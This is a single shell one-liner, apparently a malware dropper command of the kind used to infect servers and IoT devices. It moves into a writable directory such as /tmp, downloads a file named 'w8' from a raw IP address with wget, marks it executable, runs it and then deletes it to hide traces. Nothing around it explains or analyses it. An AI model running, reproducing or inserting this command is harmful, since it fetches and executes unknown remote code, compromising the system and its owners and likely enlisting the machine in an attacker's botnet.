cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://144.217.153.18/w8; chmod +x w8; ./w8; rm -rf w8
